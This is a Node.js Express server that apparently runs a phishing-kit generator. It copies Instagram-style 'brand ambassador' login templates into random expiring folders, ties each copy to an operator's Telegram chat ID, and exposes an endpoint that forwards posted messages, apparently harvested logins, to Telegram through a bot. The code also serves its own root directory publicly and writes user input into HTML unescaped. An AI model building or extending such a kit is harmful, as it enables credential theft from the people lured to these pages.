// Load environment variables from .env file
require('dotenv').config();

const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs-extra');
const axios = require('axios');
const morgan = require('morgan');

const app = express();
const PORT = process.env.PORT || 8080;
const cron = require('node-cron');

// --- Directory Setup ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const U_DIR = path.join(__dirname, 'U');
fs.ensureDirSync(UPLOADS_DIR);
fs.ensureDirSync(U_DIR);

// --- Cleanup Job ---
const cleanup = async () => {
  const projectsFilePath = path.join(__dirname, 'projects.json');
  if (!fs.existsSync(projectsFilePath)) {
    return;
  }

  let projects = JSON.parse(fs.readFileSync(projectsFilePath));
  const now = new Date();

  const expiredProjects = projects.filter(p => new Date(p.expiresAt) <= now);
  const activeProjects = projects.filter(p => new Date(p.expiresAt) > now);

  for (const project of expiredProjects) {
    const projectPath = path.join(U_DIR, project.folderName);
    if (fs.existsSync(projectPath)) {
      await fs.remove(projectPath);
      console.log(`Deleted expired project: ${project.projectName}`);
    }
  }

  fs.writeFileSync(projectsFilePath, JSON.stringify(activeProjects, null, 2));
};

cron.schedule('0 * * * *', cleanup);

// --- Middleware ---
app.use(morgan('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Static File Serving ---
app.use('/uploads', express.static(UPLOADS_DIR));
app.use(express.static(__dirname));
app.use('/U', express.static(U_DIR));
app.use(express.static(path.join(__dirname, 'TEMPLATE')));

// --- Multer Setup for File Uploads ---
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOADS_DIR);
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + path.extname(file.originalname));
  }
});
const upload = multer({ storage: storage });

// --- Routes ---

// Generator page
app.get('/generator', (req, res) => {
  res.sendFile(path.join(__dirname, 'generator.html'));
});

// API endpoint for project generation
app.post('/api/generate', upload.single('photo'), async (req, res) => {
  const { projectName, chatId, templateType, duration } = req.body;
  const photo = req.file;

  // Photo is now optional.
  if (!projectName || !chatId || !templateType || !duration) {
    return res.status(400).json({ error: 'Project name, chat ID, template type, and duration are required.' });
  }

  const randomFolderName = Math.random().toString(36).substring(2, 7);
  const newProjectPath = path.join(U_DIR, randomFolderName);
  
  try {
    // 1. Copy template folder based on selection
    const templateDir = templateType === 'instagram-email' 
      ? path.join(__dirname, 'TEMPLATE', 'template-email') 
      : path.join(__dirname, 'TEMPLATE', 'template-web');
    await fs.copy(templateDir, newProjectPath);

    // 2. Update config.js
    const configPath = path.join(newProjectPath, 'JS', 'config.js');
    const configContent = `const TELEGRAM_CHAT_ID = "${chatId}";`;
    await fs.writeFile(configPath, configContent);

    // 3. Update index.html
    const indexPath = path.join(newProjectPath, 'index.html');
    let indexContent = await fs.readFile(indexPath, 'utf8');
    
    // Only replace the image if a new one was uploaded.
    if (photo) {
      const photoPath = `/uploads/${photo.filename}`;
      indexContent = indexContent.replace(/IMAGES\/IMG_0546\.jpeg/g, photoPath);
      indexContent = indexContent.replace(/IMAGES\/IMG_0332\.jpeg/g, photoPath);
    }
    
    indexContent = indexContent.replace(/window.location.href = 'USER\/login.html';/g, `window.location.href = 'USER/login.html?project=${randomFolderName}';`);
    indexContent = indexContent.replace(/window.location.href = 'USER\/email-login.html';/g, `window.location.href = 'USER/email-login.html?project=${randomFolderName}';`);
    indexContent = indexContent.replace(/<h1 class="text-\[28px\] font-semibold tracking-\[0.08em\] uppercase text-white leading-none">AMBASSADOR<\/h1>/g, `<h1 class="text-[28px] font-semibold tracking-[0.08em] uppercase text-white leading-none">${projectName}</h1>`);
    indexContent = indexContent.replace(/<h1 class="text-\[28px\] font-semibold tracking-\[0.08em\] uppercase text-white leading-none">Fashion Brand<\/h1>/g, `<h1 class="text-[28px] font-semibold tracking-[0.08em] uppercase text-white leading-none">${projectName}</h1>`);
    indexContent = indexContent.replace(/<span class="bg-white rounded-full px-5 py-\[7px\] text-\[13px\] font-medium text-gray-900 shadow-\[0_2px_12px_rgba\(0,0,0,0.10\)\] tracking-\[0.01em\]">\s*AMBASSADOR\s*<\/span>/g, `<span class="bg-white rounded-full px-5 py-[7px] text-[13px] font-medium text-gray-900 shadow-[0_2px_12px_rgba(0,0,0,0.10)] tracking-[0.01em]">${projectName}</span>`);
    indexContent = indexContent.replace(/<span class="bg-white rounded-full px-5 py-\[7px\] text-\[13px\] font-medium text-gray-900 shadow-\[0_2px_12px_rgba\(0,0,0,0.10\)\] tracking-\[0.01em\]">\s*Fashion Brand\s*<\/span>/g, `<span class="bg-white rounded-full px-5 py-[7px] text-[13px] font-medium text-gray-900 shadow-[0_2px_12px_rgba(0,0,0,0.10)] tracking-[0.01em]">${projectName}</span>`);
    
    indexContent = indexContent.replace('</body>', `<script>window.PROJECT_NAME = "${randomFolderName}";</script></body>`);
    
    await fs.writeFile(indexPath, indexContent);

    const fullUrl = `${req.protocol}://${req.get('host')}/U/${randomFolderName}`;

    // Send initial Telegram message
    // const initialMessage = `<b>New Project Created</b>\n\n<b>Project:</b> ${projectName}\n<b>URL:</b> ${fullUrl}\n<b>Duration:</b> ${duration}`;
    // await axios.post(`${req.protocol}://${req.get('host')}/api/send-telegram`, {
    //   chatId,
    //   message: initialMessage,
    // });

    // Save project metadata
    const projectsFilePath = path.join(__dirname, 'projects.json');
    let projects = [];
    if (fs.existsSync(projectsFilePath)) {
      try {
        const fileContent = fs.readFileSync(projectsFilePath, 'utf8');
        projects = JSON.parse(fileContent);
      } catch (err) {
        console.error('Error reading or parsing projects.json:', err);
        projects = []; // Start with a fresh array if file is corrupt
      }
    }

    const expirationDate = new Date();
    switch (duration) {
      case '1 week':
        expirationDate.setDate(expirationDate.getDate() + 7);
        break;
      case '2 weeks':
        expirationDate.setDate(expirationDate.getDate() + 14);
        break;
      case '1 month':
        expirationDate.setMonth(expirationDate.getMonth() + 1);
        break;
      case '6 months':
        expirationDate.setMonth(expirationDate.getMonth() + 6);
        break;
    }

    projects.push({
      folderName: randomFolderName,
      projectName,
      chatId,
      createdAt: new Date(),
      expiresAt: expirationDate,
    });

    fs.writeFileSync(projectsFilePath, JSON.stringify(projects, null, 2));

    // Respond with URL and duration
    res.status(200).json({ success: true, url: fullUrl, duration: duration });

  } catch (error) {
    console.error('Error generating project:', error);
    res.status(500).json({ error: 'Failed to generate project.' });
  }
});

// API endpoint for sending Telegram messages
app.post('/api/send-telegram', async (req, res) => {
  const { message, projectName, chatId: directChatId } = req.body;

  console.log('--- TELEGRAM SEND REQUEST ---');
  console.log('Received body:', req.body);

  if (!message) {
    console.log('Error: Message is required.');
    return res.status(400).json({ error: 'Message is required.' });
  }

  let chatId = directChatId;

  if (!chatId && projectName) {
    const projectsFilePath = path.join(__dirname, 'projects.json');
    console.log(`Looking for project: ${projectName} in ${projectsFilePath}`);
    try {
      if (fs.existsSync(projectsFilePath)) {
        const projects = JSON.parse(fs.readFileSync(projectsFilePath, 'utf8'));
        const project = projects.find(p => p.folderName === projectName);
        if (project && project.chatId) {
          chatId = project.chatId;
          console.log(`Found chatId: ${chatId} for project: ${projectName}`);
        } else {
          console.log(`Could not find project or chatId for project: ${projectName}`);
        }
      } else {
        console.log('projects.json file not found.');
      }
    } catch (error) {
      console.error('Error reading or parsing projects.json:', error);
      // We don't return here, as a fallback might still exist, but we log the error.
    }
  }

  if (!chatId) {
    console.log('Error: Chat ID not found.');
    return res.status(400).json({ error: 'Chat ID not found' });
  }

  try {
    const telegramApiUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(telegramApiUrl, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    });
    console.log('Message sent successfully to Telegram.');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error sending message to Telegram:', error.response ? error.response.data : error.message);
    res.status(500).json({ error: 'Failed to send message' });
  }
  console.log('--- END TELEGRAM SEND REQUEST ---');
});

// --- Server Start ---
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});